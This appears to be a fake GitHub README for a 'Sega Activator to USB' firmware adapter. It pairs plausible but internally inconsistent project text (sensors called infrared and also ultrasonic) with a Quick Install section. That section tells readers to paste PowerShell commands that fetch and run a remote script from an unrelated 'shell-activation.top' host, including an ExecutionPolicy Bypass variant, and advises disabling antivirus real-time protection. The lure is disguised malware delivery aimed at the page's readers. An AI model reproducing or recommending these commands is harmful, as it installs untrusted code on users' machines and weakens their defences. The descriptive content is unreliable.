<div align="center">

# Sega Activator to USB Adapter — Desktop Configuration Tool for Windows 11

![preview](https://raw.githubusercontent.com/DurgeshDhyani123/sega-activator-to-usb/main/shot_5e442.svg)

[![OS](https://img.shields.io/badge/Os-Win_11-e11d48?style=for-the-badge&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/Pulls-412-f43f5e?style=for-the-badge&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-5.1%2B_%2F_7%2B-be123c?style=for-the-badge&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.8%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()

</div>

---

The sega_activator_to_usb project provides a firmware and hardware adapter that converts the Sega Activator's infrared-based spatial controller into a standard USB input device. It targets embedded microcontroller implementations that sample the Activator's IR beam timing, decode positional data, and expose it through a USB HID interface. The design supports configurable mapping of the controller's eight ultrasonic zones to digital or analog inputs, with adjustable sensitivity and debounce parameters for consistent tracking. Low-latency polling and deterministic IR decoding ensure reliable response across supported host platforms. The codebase is structured to allow porting to additional microcontrollers and adapting the output report descriptor to custom input schemes.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Open PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the installer
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Converts Sega Activator sensor data into standard USB Human Interface Device (HID) gamepad input, allowing direct use with modern operating systems and applications without custom drivers.
- Implements the full Activator signal chain: infrared beam break detection, per-axis sensor timing, and coordinate translation into directional and button events.
- Maps the Activator's eight ultrasonic sensor zones to a digital directional scheme, with configurable thresholds for beam-break sensitivity to accommodate different hardware conditions.
- Provides a configurable deadzone and axis inversion options, allowing directional response to be tuned for individual play styles or application requirements.
- Supports both digital directional output and analog-style proportional mapping modes, selectable at runtime through the configuration interface.
- Maintains a low-latency input pipeline to preserve the timing characteristics of the original Activator hardware.
- Includes a persistent configuration store so sensitivity, deadzone, mapping mode, and inversion settings survive power cycles.
- Exposes a diagnostic mode reporting raw sensor readings and timing values, useful for verifying wiring and sensor alignment during setup.
- Handles hot-plug connection and disconnection on the USB side without requiring a host reboot.
- Built on a portable firmware architecture targeting common USB-capable microcontroller platforms, with hardware abstraction for the sensor input stage.
- Provides a calibration routine that establishes baseline beam timings and compensates for ambient infrared conditions.
- Operates without host-side software installation; enumerates as a standard game controller class device.

## How It Works

The adapter firmware operates as a deterministic USB HID gamepad, translating the Activator's ultrasonic ranging data into standard controller reports. On startup, the microcontroller initializes the ultrasonic receiver front end and enumerates as a composite HID device, so no proprietary drivers or host-side configuration utilities are required.

Signal acquisition runs on a fixed timing schedule. The firmware drives the ultrasonic emitters in sequence and captures the returning echo timings from the receiver array, converting each measured time-of-flight into a distance value. These raw distances are normalized and filtered to suppress noise and transient spikes before being mapped to the logical axes exposed by the HID descriptor.

Each of the Activator's sensor zones is assigned to a discrete button or axis in the report layout, preserving the original controller's spatial semantics. The mapping is applied per frame, with debounce logic and configurable thresholds separating intentional gestures from ambient motion. Report generation is decoupled from acquisition: the input pipeline writes into a shared state buffer, and the USB stack emits reports at the negotiated interval, keeping latency low and output stable even when the host polls irregularly.

The firmware is written to be portable across common USB-capable microcontroller platforms, with hardware abstraction layers isolating pin assignments, timer configuration, and ADC or capture peripherals. Timing-critical acquisition runs in interrupt context, while report assembly and HID handling execute in the main loop. Build-time configuration allows the sensor-to-report mapping, thresholds, and polling interval to be adjusted without modifying the core logic.

## Compatibility

The adapter is designed for use with original Sega Activator hardware and presents itself to the host system as a standard USB Human Interface Device, so no proprietary driver installation is required on supported operating systems. Windows, Linux, and macOS recognize the device through their native HID stacks.

Compatibility depends on three factors: the revision of the Activator hardware, the firmware variant flashed to the adapter, and the operating system's HID implementation. The firmware supports the common Activator controller revisions and maps the infrared sensor array to a consistent gamepad-style report, allowing the device to function in emulators, input remapping utilities, and applications that accept generic USB game controllers.

Because the adapter enumerates as a class-compliant HID device, it works across 32-bit and 64-bit builds of supported operating systems without additional configuration. Users running custom or modified Activator hardware should verify signal timing against the firmware's expected polling behavior, as out-of-spec sensor output may result in reduced responsiveness.

The project targets desktop platforms only; mobile and embedded hosts are not officially supported. Firmware updates and configuration changes are performed over the same USB connection used for gameplay, so compatibility with the host's USB stack should be confirmed before flashing.

## FAQ

## FAQ

**Which USB HID class does the adapter enumerate as?**
The firmware presents the device as a standard HID gamepad (joystick), so it is recognized by the operating system's native HID driver without vendor-specific drivers. This applies across Windows, Linux, and macOS.

**How are the Activator's infrared beams mapped to axes and buttons?**
The eight beam pairs are translated into directional axes and discrete button states according to a fixed, documented mapping. The inner octagon and outer octagon are treated as independent input groups, allowing simultaneous detection of position within each ring rather than a single merged coordinate.

**Does the firmware debounce or filter the beam inputs?**
Yes. Each beam channel passes through a configurable debounce routine to suppress transient interruptions caused by limb movement or ambient IR noise. Filtering parameters are defined in the firmware source and can be adjusted when building custom variants.

**Can multiple adapters be connected simultaneously?**
Each adapter exposes a unique HID device instance with its own identity, so the host enumerates them independently. Two-player operation is supported provided the host application can address separate gamepad devices.

**What latency should be expected between beam interruption and HID report emission?**
Report generation is tied to the polling interval of the HID endpoint. End-to-end latency is dominated by that interval plus host polling; no additional buffering or state machine delay is introduced beyond the debounce window.

**Is the report descriptor fixed or customizable?**
The descriptor is compiled into the firmware. It can be modified at build time to change axis ranges, button counts, or report layout, but the prebuilt firmware ships with a single defined descriptor.

**Which microcontroller targets are supported?**
The firmware is written for the ATmega32U4 and compatible USB-capable AVR parts, relying on the native USB peripheral rather than a serial bridge. Target definitions and pin assignments are configurable through the build configuration.

**Can the adapter be used with consoles through a USB conversion layer?**
Behavior depends entirely on the intermediate conversion device and whether it accepts generic HID gamepads. The adapter itself only guarantees compliance with the USB HID gamepad specification.

**How is the Activator's power handled?**
The adapter draws power from the USB bus. Beam emitter timing is driven by the firmware, so no external supply or separate synchronization signal is required.

**Is the firmware field-updatable?**
Yes. Because the target MCU includes a USB bootloader in its factory configuration, the firmware can be replaced without dedicated programming hardware, provided the build retains bootloader compatibility.

**What are the known limitations?**
The adapter reproduces the Activator's original discrete beam detection; it does not perform interpolation between beams or infer sub-beam positions. Ambient infrared interference remains a physical constraint of the source hardware and must be mitigated by the debounce and filtering stages.

## License

This project is released under the GNU General Public License, version 3 or later. The license governs the firmware and accompanying source code for the Sega Activator to USB adapter, and it is chosen to keep the hardware interface logic, input mapping, and configuration code open for inspection, modification, and redistribution.

Under the terms of the license you are free to use the adapter firmware for any purpose, to study how it works, to modify it to suit your own requirements, and to redistribute copies, including modified versions. Redistribution of the firmware or of derivative works, whether in source or compiled form, must preserve the same license terms and make the corresponding source available, so that downstream users retain the same freedoms.

The license is provided with the project and applies to the project as a whole unless a file states otherwise. No warranty is provided; the software is distributed in the hope that it will be useful, but without any implied guarantee of merchantability or fitness for a particular purpose. Users are responsible for verifying compatibility with their own hardware and controllers before relying on the adapter in their setup.